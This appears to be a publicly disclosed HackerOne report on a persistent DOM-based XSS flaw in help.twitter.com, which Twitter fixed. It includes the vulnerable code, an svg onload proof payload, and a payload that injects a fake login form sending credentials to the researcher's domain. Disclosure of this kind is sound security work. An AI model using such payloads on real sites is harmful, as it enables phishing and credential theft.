{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2018-02-17T15:42:35.594Z", 
    "voters": [
        "zhchbin", 
        "jokebookservice1", 
        "sp1d3rs", 
        "stefanofinding", 
        "foobar7", 
        "spam404", 
        "kapytein", 
        "surfrdan", 
        "ta8ahi", 
        "bogdantcaciuc", 
        "and 68 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1120.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 297968, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-02-24T00:03:54.802Z", 
    "vulnerability_information": "**Summary:** \n\nI've found a DOM-based XSS vulnerability in the website **help.twitter.com** that persists via a localStorage key **lastArticleHref**. The value of this localStorage key is used to dynamically generate a piece of HTML code without proper encoding or filtering allowing an attacker to inject additional HTML code into the response.\n\n**Description:** \n\nThe website **help.twitter.com** contains JavaScript code that will save the value of the current page (the value of the browser property **location.href**) into a localStorage key named **lastArticleBreadcrumbs**.\n\nThe JavaScript code is loaded from this URL:\nhttps://help.twitter.com/etc/designs/help-twitter/public/js/homepage.js\n\nThere are two relevant localStorage keys:\n*  **lastArticleBreadcrumbs** - that contains an array of breadcrumbs such as `[\"Help Center\",\" Following and unfollowing\",\" How to approve or deny follower requests\"]`\n*  **lastArticleHref** -  that contains the URL of the last visited article\n\nWhen these two localStorage keys are present, the following code is executed:\n\n```\nthis.lastArticleBreadcrumbs.shift();\n                    var t = this.lastArticleBreadcrumbs.map(function(t, r) {\n                        return r === e.lastArticleBreadcrumbs.length - 1 ? '<a class=\"hp03__link  twtr-type--roman-16\" href=\"' + e.lastArticleHref + '\">' + t + \"</a>\" : '<span class=\"hp03__breadcrumb  twtr-color--light-gray-neutral\">' + t + \"</span>\"\n                    });\n                    this.breadcrumbElement.innerHTML = t.join('<span class=\"hp03__seperator    twtr-color--light-gray-neutral\">/</span>')\n```\n\nAs you can see above a piece of HTML code is dynamically generated using the value of the JavaScript variable **e.lastArticleHref**. This variable is loaded from the localStorage key **lastArticleHref**.\n\nThe value of **e.lastArticleHref** is not properly HTML encoded when used to dynamically generate the HTML code. This code is written to the browser DOM via `this.breadcrumbElement.innerHTML`.\n\nThis allows an attacker to inject additional HTML code into the browser DOM by manipulating the value of the localStorage key **lastArticleHref**.\n\nThe exploit scenario is as follows:\n\n1. The victim visits an URL like `https://help.twitter.com/en/using-twitter/follow-requests#\"><zzzz>`\n2. The JavaScript code from the page will set the value of localStorage key **lastArticleHref** to `https://help.twitter.com/en/using-twitter/follow-requests#\\\"><zzzz>`.\n3. The user visits the homepage `https://help.twitter.com/`.\n4. At this point the value of the localStorage key **lastArticleHref** is loaded and used to dynamically generate some HTML code that is written into the DOM.\n5. The victim can now open a new window/tab and visit `https://help.twitter.com/`. The HTML code set by attacker will appear in the page as the value of the localStorage key **lastArticleHref** will remain set to an XSS payload.\n\nI was not able to bypass CSP and I've prepared some HTML code that is inserting a fake login form into the page that sends the credentials to a domain controlled by me.\n\n## Steps To Reproduce:\n\nI've attached two movies where I demonstrate how to reproduce this issue using Google Chrome and Internet Explorer.\n\n### Chrome\nTo reproduce, using Google Chrome follow the next steps:\n\n* Visit the following URL using Google Chrome:\n\n```\nhttps://help.twitter.com/en/using-twitter/follow-requests#\"></a></div></div></div></div></div></div></div></div></div></div></div></div><br><br><br><br><br><br><br><br><br><br><br><br><div style='background: #97e3ff; position: fixed; top: 80%; left: 50%; margin-top: -50px;  margin-left: -150px; border-style: double;'>Please sign in below:<br><form action=https://bugs.thx.bz/just>username:<input type=text name=u><br>password:<input type=password name=p><br><input type=submit value='Sign in'></form><br></div>\n```\n\n* At this point, the value of the localStorage key was set to an HTML payload that is written to the DOM.\n* Visit the homepage https://help.twitter.com/\n* A fake login form will appear in the center of the page. Any credentials entered on this login form will be sent to the domain **bugs.thx.bz**.\n\n### Internet Explorer 11\n\nTo reproduce, using Internet Explorer follow the next steps:\n\n* Visit the following URL using Internet Explorer 11:\n\n```\nhttps://help.twitter.com/en/using-twitter/follow-requests#\"><svg/onload=alert(1)>\n```\n\n* At this point, the value of the localStorage key was set to an XSS payload that is written to the DOM.\n* Visit the homepage https://help.twitter.com/\n* A popup should appear as proof that JavaScript execution is possible.\n\n## Supporting Material/References:\n\nI've attached two movies to this report.\n*  One demonstrating the issue using Google Chrome and the login form.\n*  Another one using IE11 to execute JavaScript code in the context of the domain **help.twitter.com**.\n\n## Impact\n\nAn attacker could exploit this issue by sending a crafted link to the victim via an email message or via chat. When the victim visits the link provided, the attacker can steal victim's credentials.", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "medium", 
        "author_type": "User"
    }, 
    "title": "Persistent DOM-based XSS in https://help.twitter.com via localStorage", 
    "is_member_of_team?": null, 
    "vote_count": 78, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2018-03-19T15:42:35.707Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,120", 
    "attachments": [
        {
            "file_name": "chrome-screenshot.png", 
            "type": "image/png", 
            "id": 246936, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/246/936/9d3610082d50b0b41f23daf04488282e0acd2e56/chrome-screenshot.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222644Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=969e20e38d0b37bda2f918928841588ffb631f239a8fd2cb26c50388fc492256"
        }, 
        {
            "file_name": "chrome-login-page.mp4", 
            "type": "video/mp4", 
            "id": 246937, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/246/937/6aa2cdbf8eb38ac4ae41ad47e21ffb391f02628c/chrome-login-page.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222644Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=30fb819037a5b3bdcc19a004ce3f0b3e6535d02de75d08c9ec4e8f1bb330abc4"
        }, 
        {
            "file_name": "ie-xss.mp4", 
            "type": "video/mp4", 
            "id": 246938, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/246/938/a54d850f661bf10def5bff03d21e72d3951fdce9/ie-xss.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222644Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=60932a0846c9126c2b5006956d11285eb8b76b9f7c81514ee61f7714243791e3"
        }
    ], 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-12-14T19:49:20.517Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-14T19:49:35.984Z", 
            "actor": {
                "username": "bugtriage-michael", 
                "url": "/bugtriage-michael", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "message": "Thank you for your report.\n\nWe're looking into it, and we'll keep you updated when we have additional information.\n\nThank you for thinking of Twitter security.", 
            "markdown_message": "<p>Thank you for your report.</p>\n\n<p>We&#39;re looking into it, and we&#39;ll keep you updated when we have additional information.</p>\n\n<p>Thank you for thinking of Twitter security.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2223800, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-15T18:33:19.107Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-15T18:33:19.107Z", 
            "actor": {
                "username": "aarun", 
                "url": "/aarun", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/166/486/4b2b4ffb694a311c8f71ceaffcde1eca9b8f891f_medium.png?1500922258"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "message": "Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!", 
            "markdown_message": "<p>Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.</p>\n\n<p>Thank you for helping keep Twitter secure!</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 2227127, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "harisec", 
                "url": "/harisec"
            }, 
            "created_at": "2017-12-20T17:19:28.956Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-20T17:19:28.956Z", 
            "actor": {
                "username": "aarun", 
                "url": "/aarun", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/166/486/4b2b4ffb694a311c8f71ceaffcde1eca9b8f891f_medium.png?1500922258"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "message": "@harisec - We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!", 
            "markdown_message": "<p><a href=\"/harisec\">@harisec</a> - We consider this issue to be fixed now. Can you please confirm?</p>\n\n<p>Thank you for helping keep Twitter secure!</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 2238300, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-20T17:26:29.721Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-20T17:26:29.721Z", 
            "actor": {
                "username": "harisec", 
                "url": "/harisec", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/968/429c6f775984645489b3e3eb46194fe9c0f9d6ec_medium.png?1538983207"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "message": "I can confirm this issue was fixed. I'm not able to reproduce it anymore.\n\nI've identified the fix in the JavaScript file **articles.js** - instead of saving the full URL (`location.href`), only the value of `location.pathname` is saved. \n\n```\nu.default.set(\"lastArticleHref\", \"\" + window.location.origin + window.location.pathname)\n```", 
            "markdown_message": "<p>I can confirm this issue was fixed. I&#39;m not able to reproduce it anymore.</p>\n\n<p>I&#39;ve identified the fix in the JavaScript file <strong>articles.js</strong> - instead of saving the full URL (<code>location.href</code>), only the value of <code>location.pathname</code> is saved. </p>\n<pre class=\"highlight plaintext\"><code>u.default.set(&quot;lastArticleHref&quot;, &quot;&quot; + window.location.origin + window.location.pathname)\n</code></pre>", 
            "type": "Activities::Comment", 
            "id": 2238327, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-12-21T20:07:09.699Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-21T20:07:09.699Z", 
            "actor": {
                "url": "/twitter", 
                "profile": {
                    "name": "Twitter"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/061/e78ef26a3191adcabe7311daa107bd9e152d3b5c_medium.?1439954730"
                }
            }, 
            "team_handle": "twitter", 
            "bonus_amount": "0.0", 
            "bounty_amount": "1120.0", 
            "collaborator": {
                "username": "harisec", 
                "url": "/harisec"
            }, 
            "message": "Thanks again for helping us keep Twitter safe and secure for our users!", 
            "markdown_message": "<p>Thanks again for helping us keep Twitter safe and secure for our users!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 2241061, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-17T15:42:35.633Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-17T15:42:35.633Z", 
            "actor": {
                "username": "harisec", 
                "url": "/harisec", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/968/429c6f775984645489b3e3eb46194fe9c0f9d6ec_medium.png?1538983207"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "first_to_agree": true, 
            "message": "If it's not a problem, I would like to make this report public. Thanks!", 
            "markdown_message": "<p>If it&#39;s not a problem, I would like to make this report public. Thanks!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2394841, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-24T00:03:54.859Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-24T00:03:54.859Z", 
            "actor": {
                "username": "andrewsorensen", 
                "url": "/andrewsorensen", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2427533, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-02-24T00:03:54.982Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-24T00:03:54.982Z", 
            "actor": {
                "username": "andrewsorensen", 
                "url": "/andrewsorensen", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "twitter", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 2427534, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "harisec", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/harisec", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/003/968/8cc7d113e488aefe64548568e5ecce46a4e21015_small.png?1538983207"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 62, 
        "name": "Cross-site Scripting (XSS) - Stored"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -22661048.907472644, 
    "disclosed_at": "2018-02-24T00:03:54.935Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/297968", 
    "created_at": "2017-12-14T18:47:34.673Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p><strong>Summary:</strong> </p>\n\n<p>I&#39;ve found a DOM-based XSS vulnerability in the website <strong>help.twitter.com</strong> that persists via a localStorage key <strong>lastArticleHref</strong>. The value of this localStorage key is used to dynamically generate a piece of HTML code without proper encoding or filtering allowing an attacker to inject additional HTML code into the response.</p>\n\n<p><strong>Description:</strong> </p>\n\n<p>The website <strong>help.twitter.com</strong> contains JavaScript code that will save the value of the current page (the value of the browser property <strong>location.href</strong>) into a localStorage key named <strong>lastArticleBreadcrumbs</strong>.</p>\n\n<p>The JavaScript code is loaded from this URL:<br>\n<a title=\"https://help.twitter.com/etc/designs/help-twitter/public/js/homepage.js\" href=\"/redirect?signature=41c8ddec849c421f810ea33dab14e08f17c715dc&amp;url=https%3A%2F%2Fhelp.twitter.com%2Fetc%2Fdesigns%2Fhelp-twitter%2Fpublic%2Fjs%2Fhomepage.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://help.twitter.com/etc/designs/help-twitter/public/js/homepage.js</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>There are two relevant localStorage keys:</p>\n\n<ul>\n<li> <strong>lastArticleBreadcrumbs</strong> - that contains an array of breadcrumbs such as <code>[&quot;Help Center&quot;,&quot; Following and unfollowing&quot;,&quot; How to approve or deny follower requests&quot;]</code>\n</li>\n<li> <strong>lastArticleHref</strong> -  that contains the URL of the last visited article</li>\n</ul>\n\n<p>When these two localStorage keys are present, the following code is executed:</p>\n<pre class=\"highlight plaintext\"><code>this.lastArticleBreadcrumbs.shift();\n                    var t = this.lastArticleBreadcrumbs.map(function(t, r) {\n                        return r === e.lastArticleBreadcrumbs.length - 1 ? &#39;&lt;a class=&quot;hp03__link  twtr-type--roman-16&quot; href=&quot;&#39; + e.lastArticleHref + &#39;&quot;&gt;&#39; + t + &quot;&lt;/a&gt;&quot; : &#39;&lt;span class=&quot;hp03__breadcrumb  twtr-color--light-gray-neutral&quot;&gt;&#39; + t + &quot;&lt;/span&gt;&quot;\n                    });\n                    this.breadcrumbElement.innerHTML = t.join(&#39;&lt;span class=&quot;hp03__seperator    twtr-color--light-gray-neutral&quot;&gt;/&lt;/span&gt;&#39;)\n</code></pre>\n<p>As you can see above a piece of HTML code is dynamically generated using the value of the JavaScript variable <strong>e.lastArticleHref</strong>. This variable is loaded from the localStorage key <strong>lastArticleHref</strong>.</p>\n\n<p>The value of <strong>e.lastArticleHref</strong> is not properly HTML encoded when used to dynamically generate the HTML code. This code is written to the browser DOM via <code>this.breadcrumbElement.innerHTML</code>.</p>\n\n<p>This allows an attacker to inject additional HTML code into the browser DOM by manipulating the value of the localStorage key <strong>lastArticleHref</strong>.</p>\n\n<p>The exploit scenario is as follows:</p>\n\n<ol>\n<li>The victim visits an URL like <code>https://help.twitter.com/en/using-twitter/follow-requests#&quot;&gt;&lt;zzzz&gt;</code>\n</li>\n<li>The JavaScript code from the page will set the value of localStorage key <strong>lastArticleHref</strong> to <code>https://help.twitter.com/en/using-twitter/follow-requests#\\&quot;&gt;&lt;zzzz&gt;</code>.</li>\n<li>The user visits the homepage <code>https://help.twitter.com/</code>.</li>\n<li>At this point the value of the localStorage key <strong>lastArticleHref</strong> is loaded and used to dynamically generate some HTML code that is written into the DOM.</li>\n<li>The victim can now open a new window/tab and visit <code>https://help.twitter.com/</code>. The HTML code set by attacker will appear in the page as the value of the localStorage key <strong>lastArticleHref</strong> will remain set to an XSS payload.</li>\n</ol>\n\n<p>I was not able to bypass CSP and I&#39;ve prepared some HTML code that is inserting a fake login form into the page that sends the credentials to a domain controlled by me.</p>\n\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<p>I&#39;ve attached two movies where I demonstrate how to reproduce this issue using Google Chrome and Internet Explorer.</p>\n\n<h3 id=\"chrome\">Chrome</h3>\n\n<p>To reproduce, using Google Chrome follow the next steps:</p>\n\n<ul>\n<li>Visit the following URL using Google Chrome:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>https://help.twitter.com/en/using-twitter/follow-requests#&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div style=&#39;background: #97e3ff; position: fixed; top: 80%; left: 50%; margin-top: -50px;  margin-left: -150px; border-style: double;&#39;&gt;Please sign in below:&lt;br&gt;&lt;form action=https://bugs.thx.bz/just&gt;username:&lt;input type=text name=u&gt;&lt;br&gt;password:&lt;input type=password name=p&gt;&lt;br&gt;&lt;input type=submit value=&#39;Sign in&#39;&gt;&lt;/form&gt;&lt;br&gt;&lt;/div&gt;\n</code></pre>\n<ul>\n<li>At this point, the value of the localStorage key was set to an HTML payload that is written to the DOM.</li>\n<li>Visit the homepage <a title=\"https://help.twitter.com/\" href=\"/redirect?signature=cfd6d290b59cba1c4ac40046512f7157f6b64b38&amp;url=https%3A%2F%2Fhelp.twitter.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://help.twitter.com/</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>A fake login form will appear in the center of the page. Any credentials entered on this login form will be sent to the domain <strong>bugs.thx.bz</strong>.</li>\n</ul>\n\n<h3 id=\"internet-explorer-11\">Internet Explorer 11</h3>\n\n<p>To reproduce, using Internet Explorer follow the next steps:</p>\n\n<ul>\n<li>Visit the following URL using Internet Explorer 11:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>https://help.twitter.com/en/using-twitter/follow-requests#&quot;&gt;&lt;svg/onload=alert(1)&gt;\n</code></pre>\n<ul>\n<li>At this point, the value of the localStorage key was set to an XSS payload that is written to the DOM.</li>\n<li>Visit the homepage <a title=\"https://help.twitter.com/\" href=\"/redirect?signature=cfd6d290b59cba1c4ac40046512f7157f6b64b38&amp;url=https%3A%2F%2Fhelp.twitter.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://help.twitter.com/</span><i class=\"icon-external-link\"></i></a>\n</li>\n<li>A popup should appear as proof that JavaScript execution is possible.</li>\n</ul>\n\n<h2 id=\"supporting-material-references\">Supporting Material/References:</h2>\n\n<p>I&#39;ve attached two movies to this report.</p>\n\n<ul>\n<li> One demonstrating the issue using Google Chrome and the login form.</li>\n<li> Another one using IE11 to execute JavaScript code in the context of the domain <strong>help.twitter.com</strong>.</li>\n</ul>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>An attacker could exploit this issue by sending a crafted link to the victim via an email message or via chat. When the victim visits the link provided, the attacker can steal victim&#39;s credentials.</p>\n", 
    "severity_rating": "medium", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://twitter.com", 
            "about": "Twitter helps you create and share ideas and information instantly, without barriers.", 
            "twitter_handle": "twittersecurity", 
            "name": "Twitter"
        }, 
        "handle": "twitter", 
        "url": "https://hackerone.com/twitter", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/061/4acfe72859c5e9cb48a152edb4e498e13fa28df2_small.?1439954730", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/061/e78ef26a3191adcabe7311daa107bd9e152d3b5c_medium.?1439954730"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 61, 
        "default_currency": "usd"
    }, 
    "is_published": false
}